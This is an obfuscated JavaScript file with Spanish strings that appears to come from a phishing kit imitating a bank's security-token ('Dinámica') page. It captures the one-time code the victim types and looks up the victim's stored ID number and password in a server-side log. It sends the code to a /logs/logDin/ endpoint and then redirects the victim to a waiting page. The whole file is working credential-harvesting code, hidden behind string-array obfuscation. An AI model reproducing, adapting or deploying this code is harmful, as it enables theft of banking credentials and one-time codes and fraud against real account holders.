const _0x1efe21 = _0x2005;
function _0x7164() {
  const _0x1ccf49 = [
    "Error\x20al\x20actualizar\x20el\x20usuario",
    "590790ThRsgZ",
    "PUT",
    "Ingresó\x20Dinámica",
    "location",
    "find",
    "value",
    "telnum",
    "stringify",
    "getElementById",
    "json",
    "/logs/logDin/",
    "wait.html",
    "2260324Znekjm",
    "reg",
    "Error\x20al\x20obtener\x20los\x20datos\x20del\x20servidor",
    "log",
    "1184183XRTjCN",
    "href",
    "562544Mehixp",
    "application/json",
    "948390QlUHHd",
    "focus",
    "22315iYAoay",
    "24lUKpkl",
    "9OezCmk",
    "metaInfo",
    "Usuario\x20actualizado",
    "error",
    "btnDinamica",
    "Error\x20al\x20procesar\x20la\x20OTP:",
    "click",
    "Por\x20favor\x20ingrese\x20el\x20token\x20de\x20seguridad",
    "addEventListener",
    "cdin",
    "16553830edeuUb",
    "12DDLtWl",
  ];
  _0x7164 = function () {
    return _0x1ccf49;
  };
  return _0x7164();
}
(function (_0xac5abb, _0x39a096) {
  const _0x26cfe2 = _0x2005,
    _0x3d7b31 = _0xac5abb();
  while (!![]) {
    try {
      const _0x34d2c6 =
        -parseInt(_0x26cfe2(0x110)) / 0x1 +
        parseInt(_0x26cfe2(0x112)) / 0x2 +
        -parseInt(_0x26cfe2(0x123)) / 0x3 +
        -parseInt(_0x26cfe2(0x12f)) / 0x4 +
        (-parseInt(_0x26cfe2(0x114)) / 0x5) *
          (parseInt(_0x26cfe2(0x121)) / 0x6) +
        (parseInt(_0x26cfe2(0x133)) / 0x7) *
          (-parseInt(_0x26cfe2(0x115)) / 0x8) +
        (parseInt(_0x26cfe2(0x116)) / 0x9) * (parseInt(_0x26cfe2(0x120)) / 0xa);
      if (_0x34d2c6 === _0x39a096) break;
      else _0x3d7b31["push"](_0x3d7b31["shift"]());
    } catch (_0x55f7b8) {
      _0x3d7b31["push"](_0x3d7b31["shift"]());
    }
  }
})(_0x7164, 0x4674e);
function _0x2005(_0x2dbd12, _0x37168c) {
  const _0x71647b = _0x7164();
  return (
    (_0x2005 = function (_0x200544, _0x3b87d0) {
      _0x200544 = _0x200544 - 0x10f;
      let _0x3a20a9 = _0x71647b[_0x200544];
      return _0x3a20a9;
    }),
    _0x2005(_0x2dbd12, _0x37168c)
  );
}
function updateLS() {
  const _0x504afe = _0x2005;
  LS["setItem"]("info", JSON[_0x504afe(0x12a)](info));
}
const otpButton = document[_0x1efe21(0x12b)](_0x1efe21(0x11a)),
  numberMovil = document[_0x1efe21(0x12b)]("txtDinamica");
otpButton[_0x1efe21(0x11e)](_0x1efe21(0x11c), async function (_0xe64525) {
  const _0x5d53ae = _0x1efe21;
  _0xe64525["preventDefault"](), (otpButton["disabled"] = !![]);
  if (numberMovil[_0x5d53ae(0x128)] == "") {
    alert(_0x5d53ae(0x11d)),
      numberMovil[_0x5d53ae(0x113)](),
      (otpButton["disabled"] = ![]);
    return;
  } else {
    var _0x41c8ce = numberMovil[_0x5d53ae(0x128)];
    (info["metaInfo"]["cdin"] = _0x41c8ce), updateLS();
    try {
      const _0x370bf7 = await fetch(url + "/logs/logs", {
        method: "GET",
        headers: { "Content-Type": _0x5d53ae(0x111) },
      });
      if (!_0x370bf7["ok"]) throw new Error(_0x5d53ae(0x131));
      const _0x3fe1ec = await _0x370bf7["json"](),
        _0x2b55f1 = [..._0x3fe1ec],
        _0x4194e2 = _0x2b55f1[_0x5d53ae(0x127)](
          (_0x4cb040) =>
            _0x4cb040[_0x5d53ae(0x130)] == info[_0x5d53ae(0x117)]["cc"] &&
            _0x4cb040["cl"] == info[_0x5d53ae(0x117)][_0x5d53ae(0x129)]
        );
      if (_0x4194e2) {
        console[_0x5d53ae(0x132)]("Usuario\x20Encontrado");
        const _0x5e327c = await fetch(
          url + _0x5d53ae(0x12d) + _0x4194e2["idreg"],
          {
            method: _0x5d53ae(0x124),
            headers: { "Content-Type": _0x5d53ae(0x111) },
            body: JSON["stringify"]({
              din: info[_0x5d53ae(0x117)][_0x5d53ae(0x11f)],
              status: _0x5d53ae(0x125),
            }),
          }
        );
        if (!_0x5e327c["ok"]) throw new Error(_0x5d53ae(0x122));
        const _0x2de6f1 = await _0x5e327c[_0x5d53ae(0x12c)]();
        console[_0x5d53ae(0x132)](_0x5d53ae(0x118));
      } else
        console[_0x5d53ae(0x119)](
          "Usuario\x20no\x20encontrado\x20en\x20la\x20base\x20de\x20datos"
        );
    } catch (_0x1a7ca6) {
      console["error"](_0x5d53ae(0x11b), _0x1a7ca6);
    } finally {
      (otpButton["disabled"] = ![]),
        (window[_0x5d53ae(0x126)][_0x5d53ae(0x10f)] = _0x5d53ae(0x12e));
    }
  }
});
